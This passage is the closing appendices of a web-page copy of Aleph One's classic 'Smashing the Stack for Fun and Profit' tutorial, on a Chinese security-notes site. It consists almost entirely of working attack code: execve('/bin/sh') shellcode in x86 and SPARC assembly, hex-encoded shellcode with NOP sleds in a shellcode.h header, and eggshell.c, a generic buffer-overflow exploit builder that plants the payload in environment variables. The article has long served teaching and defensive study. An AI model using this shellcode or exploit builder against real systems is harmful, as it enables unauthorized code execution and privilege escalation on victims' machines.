<a id=__codelineno-0-1559 name=__codelineno-0-1559 href=#__codelineno-0-1559></a>        int    $0x80
<a id=__codelineno-0-1560 name=__codelineno-0-1560 href=#__codelineno-0-1560></a>        xorl   %ebx,%ebx
<a id=__codelineno-0-1561 name=__codelineno-0-1561 href=#__codelineno-0-1561></a>        movl   %ebx,%eax
<a id=__codelineno-0-1562 name=__codelineno-0-1562 href=#__codelineno-0-1562></a>        inc    %eax
<a id=__codelineno-0-1563 name=__codelineno-0-1563 href=#__codelineno-0-1563></a>        int    $0x80
<a id=__codelineno-0-1564 name=__codelineno-0-1564 href=#__codelineno-0-1564></a>        call   -0x24
<a id=__codelineno-0-1565 name=__codelineno-0-1565 href=#__codelineno-0-1565></a>        .string \&quot;/bin/sh\&quot;
<a id=__codelineno-0-1566 name=__codelineno-0-1566 href=#__codelineno-0-1566></a>------------------------------------------------------------------------------
<a id=__codelineno-0-1567 name=__codelineno-0-1567 href=#__codelineno-0-1567></a>
<a id=__codelineno-0-1568 name=__codelineno-0-1568 href=#__codelineno-0-1568></a>SPARC/Solaris
<a id=__codelineno-0-1569 name=__codelineno-0-1569 href=#__codelineno-0-1569></a>------------------------------------------------------------------------------
<a id=__codelineno-0-1570 name=__codelineno-0-1570 href=#__codelineno-0-1570></a>        sethi   0xbd89a, %l6
<a id=__codelineno-0-1571 name=__codelineno-0-1571 href=#__codelineno-0-1571></a>        or      %l6, 0x16e, %l6
<a id=__codelineno-0-1572 name=__codelineno-0-1572 href=#__codelineno-0-1572></a>        sethi   0xbdcda, %l7
<a id=__codelineno-0-1573 name=__codelineno-0-1573 href=#__codelineno-0-1573></a>        and     %sp, %sp, %o0
<a id=__codelineno-0-1574 name=__codelineno-0-1574 href=#__codelineno-0-1574></a>        add     %sp, 8, %o1
<a id=__codelineno-0-1575 name=__codelineno-0-1575 href=#__codelineno-0-1575></a>        xor     %o2, %o2, %o2
<a id=__codelineno-0-1576 name=__codelineno-0-1576 href=#__codelineno-0-1576></a>        add     %sp, 16, %sp
<a id=__codelineno-0-1577 name=__codelineno-0-1577 href=#__codelineno-0-1577></a>        std     %l6, [%sp - 16]
<a id=__codelineno-0-1578 name=__codelineno-0-1578 href=#__codelineno-0-1578></a>        st      %sp, [%sp - 8]
<a id=__codelineno-0-1579 name=__codelineno-0-1579 href=#__codelineno-0-1579></a>        st      %g0, [%sp - 4]
<a id=__codelineno-0-1580 name=__codelineno-0-1580 href=#__codelineno-0-1580></a>        mov     0x3b, %g1
<a id=__codelineno-0-1581 name=__codelineno-0-1581 href=#__codelineno-0-1581></a>        ta      8
<a id=__codelineno-0-1582 name=__codelineno-0-1582 href=#__codelineno-0-1582></a>        xor     %o7, %o7, %o0
<a id=__codelineno-0-1583 name=__codelineno-0-1583 href=#__codelineno-0-1583></a>        mov     1, %g1
<a id=__codelineno-0-1584 name=__codelineno-0-1584 href=#__codelineno-0-1584></a>        ta      8
<a id=__codelineno-0-1585 name=__codelineno-0-1585 href=#__codelineno-0-1585></a>------------------------------------------------------------------------------
<a id=__codelineno-0-1586 name=__codelineno-0-1586 href=#__codelineno-0-1586></a>
<a id=__codelineno-0-1587 name=__codelineno-0-1587 href=#__codelineno-0-1587></a>SPARC/SunOS
<a id=__codelineno-0-1588 name=__codelineno-0-1588 href=#__codelineno-0-1588></a>------------------------------------------------------------------------------
<a id=__codelineno-0-1589 name=__codelineno-0-1589 href=#__codelineno-0-1589></a>        sethi   0xbd89a, %l6
<a id=__codelineno-0-1590 name=__codelineno-0-1590 href=#__codelineno-0-1590></a>        or      %l6, 0x16e, %l6
<a id=__codelineno-0-1591 name=__codelineno-0-1591 href=#__codelineno-0-1591></a>        sethi   0xbdcda, %l7
<a id=__codelineno-0-1592 name=__codelineno-0-1592 href=#__codelineno-0-1592></a>        and     %sp, %sp, %o0
<a id=__codelineno-0-1593 name=__codelineno-0-1593 href=#__codelineno-0-1593></a>        add     %sp, 8, %o1
<a id=__codelineno-0-1594 name=__codelineno-0-1594 href=#__codelineno-0-1594></a>        xor     %o2, %o2, %o2
<a id=__codelineno-0-1595 name=__codelineno-0-1595 href=#__codelineno-0-1595></a>        add     %sp, 16, %sp
<a id=__codelineno-0-1596 name=__codelineno-0-1596 href=#__codelineno-0-1596></a>        std     %l6, [%sp - 16]
<a id=__codelineno-0-1597 name=__codelineno-0-1597 href=#__codelineno-0-1597></a>        st      %sp, [%sp - 8]
<a id=__codelineno-0-1598 name=__codelineno-0-1598 href=#__codelineno-0-1598></a>        st      %g0, [%sp - 4]
<a id=__codelineno-0-1599 name=__codelineno-0-1599 href=#__codelineno-0-1599></a>        mov     0x3b, %g1
<a id=__codelineno-0-1600 name=__codelineno-0-1600 href=#__codelineno-0-1600></a>    mov -0x1, %l5
<a id=__codelineno-0-1601 name=__codelineno-0-1601 href=#__codelineno-0-1601></a>        ta      %l5 + 1
<a id=__codelineno-0-1602 name=__codelineno-0-1602 href=#__codelineno-0-1602></a>        xor     %o7, %o7, %o0
<a id=__codelineno-0-1603 name=__codelineno-0-1603 href=#__codelineno-0-1603></a>        mov     1, %g1
<a id=__codelineno-0-1604 name=__codelineno-0-1604 href=#__codelineno-0-1604></a>        ta      %l5 + 1
<a id=__codelineno-0-1605 name=__codelineno-0-1605 href=#__codelineno-0-1605></a>------------------------------------------------------------------------------
<a id=__codelineno-0-1606 name=__codelineno-0-1606 href=#__codelineno-0-1606></a>
<a id=__codelineno-0-1607 name=__codelineno-0-1607 href=#__codelineno-0-1607></a>
<a id=__codelineno-0-1608 name=__codelineno-0-1608 href=#__codelineno-0-1608></a>                 Appendix B - Generic Buffer Overflow Program
<a id=__codelineno-0-1609 name=__codelineno-0-1609 href=#__codelineno-0-1609></a>                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<a id=__codelineno-0-1610 name=__codelineno-0-1610 href=#__codelineno-0-1610></a>
<a id=__codelineno-0-1611 name=__codelineno-0-1611 href=#__codelineno-0-1611></a>shellcode.h
<a id=__codelineno-0-1612 name=__codelineno-0-1612 href=#__codelineno-0-1612></a>------------------------------------------------------------------------------
<a id=__codelineno-0-1613 name=__codelineno-0-1613 href=#__codelineno-0-1613></a>#if defined(__i386__) &amp;&amp; defined(__linux__)
<a id=__codelineno-0-1614 name=__codelineno-0-1614 href=#__codelineno-0-1614></a>
<a id=__codelineno-0-1615 name=__codelineno-0-1615 href=#__codelineno-0-1615></a>#define NOP_SIZE    1
<a id=__codelineno-0-1616 name=__codelineno-0-1616 href=#__codelineno-0-1616></a>char nop[] = &quot;\x90&quot;;
<a id=__codelineno-0-1617 name=__codelineno-0-1617 href=#__codelineno-0-1617></a>char shellcode[] =
<a id=__codelineno-0-1618 name=__codelineno-0-1618 href=#__codelineno-0-1618></a>  &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot;
<a id=__codelineno-0-1619 name=__codelineno-0-1619 href=#__codelineno-0-1619></a>  &quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot;
<a id=__codelineno-0-1620 name=__codelineno-0-1620 href=#__codelineno-0-1620></a>  &quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;;
<a id=__codelineno-0-1621 name=__codelineno-0-1621 href=#__codelineno-0-1621></a>
<a id=__codelineno-0-1622 name=__codelineno-0-1622 href=#__codelineno-0-1622></a>unsigned long get_sp(void) {
<a id=__codelineno-0-1623 name=__codelineno-0-1623 href=#__codelineno-0-1623></a>   __asm__(&quot;movl %esp,%eax&quot;);
<a id=__codelineno-0-1624 name=__codelineno-0-1624 href=#__codelineno-0-1624></a>}
<a id=__codelineno-0-1625 name=__codelineno-0-1625 href=#__codelineno-0-1625></a>
<a id=__codelineno-0-1626 name=__codelineno-0-1626 href=#__codelineno-0-1626></a>#elif defined(__sparc__) &amp;&amp; defined(__sun__) &amp;&amp; defined(__svr4__)
<a id=__codelineno-0-1627 name=__codelineno-0-1627 href=#__codelineno-0-1627></a>
<a id=__codelineno-0-1628 name=__codelineno-0-1628 href=#__codelineno-0-1628></a>#define NOP_SIZE    4
<a id=__codelineno-0-1629 name=__codelineno-0-1629 href=#__codelineno-0-1629></a>char nop[]=&quot;\xac\x15\xa1\x6e&quot;;
<a id=__codelineno-0-1630 name=__codelineno-0-1630 href=#__codelineno-0-1630></a>char shellcode[] =
<a id=__codelineno-0-1631 name=__codelineno-0-1631 href=#__codelineno-0-1631></a>  &quot;\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e&quot;
<a id=__codelineno-0-1632 name=__codelineno-0-1632 href=#__codelineno-0-1632></a>  &quot;\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0&quot;
<a id=__codelineno-0-1633 name=__codelineno-0-1633 href=#__codelineno-0-1633></a>  &quot;\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08&quot;
<a id=__codelineno-0-1634 name=__codelineno-0-1634 href=#__codelineno-0-1634></a>  &quot;\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd0\x20\x08&quot;;
<a id=__codelineno-0-1635 name=__codelineno-0-1635 href=#__codelineno-0-1635></a>
<a id=__codelineno-0-1636 name=__codelineno-0-1636 href=#__codelineno-0-1636></a>unsigned long get_sp(void) {
<a id=__codelineno-0-1637 name=__codelineno-0-1637 href=#__codelineno-0-1637></a>  __asm__(&quot;or %sp, %sp, %i0&quot;);
<a id=__codelineno-0-1638 name=__codelineno-0-1638 href=#__codelineno-0-1638></a>}
<a id=__codelineno-0-1639 name=__codelineno-0-1639 href=#__codelineno-0-1639></a>
<a id=__codelineno-0-1640 name=__codelineno-0-1640 href=#__codelineno-0-1640></a>#elif defined(__sparc__) &amp;&amp; defined(__sun__)
<a id=__codelineno-0-1641 name=__codelineno-0-1641 href=#__codelineno-0-1641></a>
<a id=__codelineno-0-1642 name=__codelineno-0-1642 href=#__codelineno-0-1642></a>#define NOP_SIZE        4
<a id=__codelineno-0-1643 name=__codelineno-0-1643 href=#__codelineno-0-1643></a>char nop[]=&quot;\xac\x15\xa1\x6e&quot;;
<a id=__codelineno-0-1644 name=__codelineno-0-1644 href=#__codelineno-0-1644></a>char shellcode[] =
<a id=__codelineno-0-1645 name=__codelineno-0-1645 href=#__codelineno-0-1645></a>  &quot;\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e&quot;
<a id=__codelineno-0-1646 name=__codelineno-0-1646 href=#__codelineno-0-1646></a>  &quot;\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0&quot;
<a id=__codelineno-0-1647 name=__codelineno-0-1647 href=#__codelineno-0-1647></a>  &quot;\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\xaa\x10\x3f\xff&quot;
<a id=__codelineno-0-1648 name=__codelineno-0-1648 href=#__codelineno-0-1648></a>  &quot;\x91\xd5\x60\x01\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd5\x60\x01&quot;;
<a id=__codelineno-0-1649 name=__codelineno-0-1649 href=#__codelineno-0-1649></a>
<a id=__codelineno-0-1650 name=__codelineno-0-1650 href=#__codelineno-0-1650></a>unsigned long get_sp(void) {
<a id=__codelineno-0-1651 name=__codelineno-0-1651 href=#__codelineno-0-1651></a>  __asm__(&quot;or %sp, %sp, %i0&quot;);
<a id=__codelineno-0-1652 name=__codelineno-0-1652 href=#__codelineno-0-1652></a>}
<a id=__codelineno-0-1653 name=__codelineno-0-1653 href=#__codelineno-0-1653></a>
<a id=__codelineno-0-1654 name=__codelineno-0-1654 href=#__codelineno-0-1654></a>#endif
<a id=__codelineno-0-1655 name=__codelineno-0-1655 href=#__codelineno-0-1655></a>------------------------------------------------------------------------------
<a id=__codelineno-0-1656 name=__codelineno-0-1656 href=#__codelineno-0-1656></a>
<a id=__codelineno-0-1657 name=__codelineno-0-1657 href=#__codelineno-0-1657></a>eggshell.c
<a id=__codelineno-0-1658 name=__codelineno-0-1658 href=#__codelineno-0-1658></a>------------------------------------------------------------------------------
<a id=__codelineno-0-1659 name=__codelineno-0-1659 href=#__codelineno-0-1659></a>/*
<a id=__codelineno-0-1660 name=__codelineno-0-1660 href=#__codelineno-0-1660></a> * eggshell v1.0
<a id=__codelineno-0-1661 name=__codelineno-0-1661 href=#__codelineno-0-1661></a> *
<a id=__codelineno-0-1662 name=__codelineno-0-1662 href=#__codelineno-0-1662></a> * Aleph One / aleph1@underground.org
<a id=__codelineno-0-1663 name=__codelineno-0-1663 href=#__codelineno-0-1663></a> */
<a id=__codelineno-0-1664 name=__codelineno-0-1664 href=#__codelineno-0-1664></a>#include &lt;stdlib.h&gt;
<a id=__codelineno-0-1665 name=__codelineno-0-1665 href=#__codelineno-0-1665></a>#include &lt;stdio.h&gt;
<a id=__codelineno-0-1666 name=__codelineno-0-1666 href=#__codelineno-0-1666></a>#include &quot;shellcode.h&quot;
<a id=__codelineno-0-1667 name=__codelineno-0-1667 href=#__codelineno-0-1667></a>
<a id=__codelineno-0-1668 name=__codelineno-0-1668 href=#__codelineno-0-1668></a>#define DEFAULT_OFFSET                    0
<a id=__codelineno-0-1669 name=__codelineno-0-1669 href=#__codelineno-0-1669></a>#define DEFAULT_BUFFER_SIZE             512
<a id=__codelineno-0-1670 name=__codelineno-0-1670 href=#__codelineno-0-1670></a>#define DEFAULT_EGG_SIZE               2048
<a id=__codelineno-0-1671 name=__codelineno-0-1671 href=#__codelineno-0-1671></a>
<a id=__codelineno-0-1672 name=__codelineno-0-1672 href=#__codelineno-0-1672></a>void usage(void);
<a id=__codelineno-0-1673 name=__codelineno-0-1673 href=#__codelineno-0-1673></a>
<a id=__codelineno-0-1674 name=__codelineno-0-1674 href=#__codelineno-0-1674></a>void main(int argc, char *argv[]) {
<a id=__codelineno-0-1675 name=__codelineno-0-1675 href=#__codelineno-0-1675></a>  char *ptr, *bof, *egg;
<a id=__codelineno-0-1676 name=__codelineno-0-1676 href=#__codelineno-0-1676></a>  long *addr_ptr, addr;
<a id=__codelineno-0-1677 name=__codelineno-0-1677 href=#__codelineno-0-1677></a>  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
<a id=__codelineno-0-1678 name=__codelineno-0-1678 href=#__codelineno-0-1678></a>  int i, n, m, c, align=0, eggsize=DEFAULT_EGG_SIZE;
<a id=__codelineno-0-1679 name=__codelineno-0-1679 href=#__codelineno-0-1679></a>
<a id=__codelineno-0-1680 name=__codelineno-0-1680 href=#__codelineno-0-1680></a>  while ((c = getopt(argc, argv, &quot;a:b:e:o:&quot;)) != EOF)
<a id=__codelineno-0-1681 name=__codelineno-0-1681 href=#__codelineno-0-1681></a>    switch (c) {
<a id=__codelineno-0-1682 name=__codelineno-0-1682 href=#__codelineno-0-1682></a>      case &#39;a&#39;:
<a id=__codelineno-0-1683 name=__codelineno-0-1683 href=#__codelineno-0-1683></a>        align = atoi(optarg);
<a id=__codelineno-0-1684 name=__codelineno-0-1684 href=#__codelineno-0-1684></a>        break;
<a id=__codelineno-0-1685 name=__codelineno-0-1685 href=#__codelineno-0-1685></a>      case &#39;b&#39;:
<a id=__codelineno-0-1686 name=__codelineno-0-1686 href=#__codelineno-0-1686></a>        bsize = atoi(optarg);
<a id=__codelineno-0-1687 name=__codelineno-0-1687 href=#__codelineno-0-1687></a>        break;
<a id=__codelineno-0-1688 name=__codelineno-0-1688 href=#__codelineno-0-1688></a>      case &#39;e&#39;:
<a id=__codelineno-0-1689 name=__codelineno-0-1689 href=#__codelineno-0-1689></a>        eggsize = atoi(optarg);
<a id=__codelineno-0-1690 name=__codelineno-0-1690 href=#__codelineno-0-1690></a>        break;
<a id=__codelineno-0-1691 name=__codelineno-0-1691 href=#__codelineno-0-1691></a>      case &#39;o&#39;:
<a id=__codelineno-0-1692 name=__codelineno-0-1692 href=#__codelineno-0-1692></a>        offset = atoi(optarg);
<a id=__codelineno-0-1693 name=__codelineno-0-1693 href=#__codelineno-0-1693></a>        break;
<a id=__codelineno-0-1694 name=__codelineno-0-1694 href=#__codelineno-0-1694></a>      case &#39;?&#39;:
<a id=__codelineno-0-1695 name=__codelineno-0-1695 href=#__codelineno-0-1695></a>        usage();
<a id=__codelineno-0-1696 name=__codelineno-0-1696 href=#__codelineno-0-1696></a>        exit(0);
<a id=__codelineno-0-1697 name=__codelineno-0-1697 href=#__codelineno-0-1697></a>    }
<a id=__codelineno-0-1698 name=__codelineno-0-1698 href=#__codelineno-0-1698></a>
<a id=__codelineno-0-1699 name=__codelineno-0-1699 href=#__codelineno-0-1699></a>  if (strlen(shellcode) &gt; eggsize) {
<a id=__codelineno-0-1700 name=__codelineno-0-1700 href=#__codelineno-0-1700></a>    printf(&quot;Shellcode is larger the the egg.\n&quot;);
<a id=__codelineno-0-1701 name=__codelineno-0-1701 href=#__codelineno-0-1701></a>    exit(0);
<a id=__codelineno-0-1702 name=__codelineno-0-1702 href=#__codelineno-0-1702></a>  }
<a id=__codelineno-0-1703 name=__codelineno-0-1703 href=#__codelineno-0-1703></a>
<a id=__codelineno-0-1704 name=__codelineno-0-1704 href=#__codelineno-0-1704></a>  if (!(bof = malloc(bsize))) {
<a id=__codelineno-0-1705 name=__codelineno-0-1705 href=#__codelineno-0-1705></a>    printf(&quot;Can&#39;t allocate memory.\n&quot;);
<a id=__codelineno-0-1706 name=__codelineno-0-1706 href=#__codelineno-0-1706></a>    exit(0);
<a id=__codelineno-0-1707 name=__codelineno-0-1707 href=#__codelineno-0-1707></a>  }
<a id=__codelineno-0-1708 name=__codelineno-0-1708 href=#__codelineno-0-1708></a>  if (!(egg = malloc(eggsize))) {
<a id=__codelineno-0-1709 name=__codelineno-0-1709 href=#__codelineno-0-1709></a>    printf(&quot;Can&#39;t allocate memory.\n&quot;);
<a id=__codelineno-0-1710 name=__codelineno-0-1710 href=#__codelineno-0-1710></a>    exit(0);
<a id=__codelineno-0-1711 name=__codelineno-0-1711 href=#__codelineno-0-1711></a>  }
<a id=__codelineno-0-1712 name=__codelineno-0-1712 href=#__codelineno-0-1712></a>
<a id=__codelineno-0-1713 name=__codelineno-0-1713 href=#__codelineno-0-1713></a>  addr = get_sp() - offset;
<a id=__codelineno-0-1714 name=__codelineno-0-1714 href=#__codelineno-0-1714></a>  printf(&quot;[ Buffer size:\t%d\t\tEgg size:\t%d\tAligment:\t%d\t]\n&quot;,
<a id=__codelineno-0-1715 name=__codelineno-0-1715 href=#__codelineno-0-1715></a>    bsize, eggsize, align);
<a id=__codelineno-0-1716 name=__codelineno-0-1716 href=#__codelineno-0-1716></a>  printf(&quot;[ Address:\t0x%x\tOffset:\t\t%d\t\t\t\t]\n&quot;, addr, offset);
<a id=__codelineno-0-1717 name=__codelineno-0-1717 href=#__codelineno-0-1717></a>
<a id=__codelineno-0-1718 name=__codelineno-0-1718 href=#__codelineno-0-1718></a>  addr_ptr = (long *) bof;
<a id=__codelineno-0-1719 name=__codelineno-0-1719 href=#__codelineno-0-1719></a>  for (i = 0; i &lt; bsize; i+=4)
<a id=__codelineno-0-1720 name=__codelineno-0-1720 href=#__codelineno-0-1720></a>    *(addr_ptr++) = addr;
<a id=__codelineno-0-1721 name=__codelineno-0-1721 href=#__codelineno-0-1721></a>
<a id=__codelineno-0-1722 name=__codelineno-0-1722 href=#__codelineno-0-1722></a>  ptr = egg;
<a id=__codelineno-0-1723 name=__codelineno-0-1723 href=#__codelineno-0-1723></a>  for (i = 0; i &lt;= eggsize - strlen(shellcode) - NOP_SIZE; i += NOP_SIZE)
<a id=__codelineno-0-1724 name=__codelineno-0-1724 href=#__codelineno-0-1724></a>    for (n = 0; n &lt; NOP_SIZE; n++) {
<a id=__codelineno-0-1725 name=__codelineno-0-1725 href=#__codelineno-0-1725></a>      m = (n + align) % NOP_SIZE;
<a id=__codelineno-0-1726 name=__codelineno-0-1726 href=#__codelineno-0-1726></a>      *(ptr++) = nop[m];
<a id=__codelineno-0-1727 name=__codelineno-0-1727 href=#__codelineno-0-1727></a>    }
<a id=__codelineno-0-1728 name=__codelineno-0-1728 href=#__codelineno-0-1728></a>
<a id=__codelineno-0-1729 name=__codelineno-0-1729 href=#__codelineno-0-1729></a>  for (i = 0; i &lt; strlen(shellcode); i++)
<a id=__codelineno-0-1730 name=__codelineno-0-1730 href=#__codelineno-0-1730></a>    *(ptr++) = shellcode[i];
<a id=__codelineno-0-1731 name=__codelineno-0-1731 href=#__codelineno-0-1731></a>
<a id=__codelineno-0-1732 name=__codelineno-0-1732 href=#__codelineno-0-1732></a>  bof[bsize - 1] = &#39;\0&#39;;
<a id=__codelineno-0-1733 name=__codelineno-0-1733 href=#__codelineno-0-1733></a>  egg[eggsize - 1] = &#39;\0&#39;;
<a id=__codelineno-0-1734 name=__codelineno-0-1734 href=#__codelineno-0-1734></a>
<a id=__codelineno-0-1735 name=__codelineno-0-1735 href=#__codelineno-0-1735></a>  memcpy(egg,&quot;EGG=&quot;,4);
<a id=__codelineno-0-1736 name=__codelineno-0-1736 href=#__codelineno-0-1736></a>  putenv(egg);
<a id=__codelineno-0-1737 name=__codelineno-0-1737 href=#__codelineno-0-1737></a>
<a id=__codelineno-0-1738 name=__codelineno-0-1738 href=#__codelineno-0-1738></a>  memcpy(bof,&quot;BOF=&quot;,4);
<a id=__codelineno-0-1739 name=__codelineno-0-1739 href=#__codelineno-0-1739></a>  putenv(bof);
<a id=__codelineno-0-1740 name=__codelineno-0-1740 href=#__codelineno-0-1740></a>  system(&quot;/bin/sh&quot;);
<a id=__codelineno-0-1741 name=__codelineno-0-1741 href=#__codelineno-0-1741></a>}
<a id=__codelineno-0-1742 name=__codelineno-0-1742 href=#__codelineno-0-1742></a>
<a id=__codelineno-0-1743 name=__codelineno-0-1743 href=#__codelineno-0-1743></a>void usage(void) {
<a id=__codelineno-0-1744 name=__codelineno-0-1744 href=#__codelineno-0-1744></a>  (void)fprintf(stderr,
<a id=__codelineno-0-1745 name=__codelineno-0-1745 href=#__codelineno-0-1745></a>    &quot;usage: eggshell [-a &lt;alignment&gt;] [-b &lt;buffersize&gt;] [-e &lt;eggsize&gt;] [-o &lt;offset&gt;]\n&quot;);
<a id=__codelineno-0-1746 name=__codelineno-0-1746 href=#__codelineno-0-1746></a>}
<a id=__codelineno-0-1747 name=__codelineno-0-1747 href=#__codelineno-0-1747></a>------------------------------------------------------------------------------
</code></pre></div> <p>原文链接： <a href=https://insecure.org/stf/smashstack.html>https://insecure.org/stf/smashstack.html</a></p> </article> </div> </div> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=页脚> <a href=../%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/ class="md-footer__link md-footer__link--prev" aria-label="上一页: 巧用命令注入的N种方式" rel=prev> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </div> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> 上一页 </span> 巧用命令注入的N种方式 </div> </div> </a> <a href=../../Android/Bad%20Binder%3AAndroid%20In-The-Wild%20Exploit/ class="md-footer__link md-footer__link--next" aria-label="下一页: Bad Binder:Android In The Wild Exploit" rel=next> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> 下一页 </span> Bad Binder:Android In The Wild Exploit </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> <div class=md-copyright__highlight> Copyright &copy; 2022 - 3022 <span style=float:right><a href=http://beian.miit.gov.cn/ >鄂ICP备19027194号-2</a></span> </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "search.suggest", "search.highlight", "search.share"], "translations": {"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "search": "../../assets/javascripts/workers/search.bd0b6b67.min.js"}</script> <script src=../../assets/javascripts/bundle.8aa65030.min.js></script> </body> </html>